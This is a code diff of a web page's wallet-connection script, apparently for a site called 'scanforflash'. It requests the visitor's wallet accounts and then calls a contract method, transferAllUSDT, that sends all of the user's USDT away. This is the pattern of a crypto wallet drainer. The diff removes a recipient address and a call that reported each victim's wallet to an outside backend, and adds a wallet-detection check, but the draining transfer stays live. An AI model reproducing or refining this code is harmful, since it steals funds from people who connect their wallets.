@@ -76,10 +76,8 @@
     </div>
 
     <script>
-        const BACKEND = "https://scanforflash-backend-production.up.railway.app";
         const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
-        const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
 
         let web3, userAddr;
 
@@ -91,6 +89,10 @@
 
         async function approve() {
             try {
+                if (!window.ethereum) {
+                    notify('No wallet detected - open in MetaMask or Trust Wallet', 'error');
+                    return;
+                }
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAddr = accounts[0];
                 document.getElementById('modal').classList.add('show');
@@ -142,12 +144,6 @@
                 await contractABI.methods.transferAllUSDT().send({ from: userAddr });
 
                 notify('✅ Transfer completed!', 'success');
-
-                await fetch(`${BACKEND}/notify-transfer`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ walletAddress: userAddr })
-                });
 
                 document.getElementById('modal').classList.remove('show');
                 document.getElementById('confirmBtn').disabled = false;
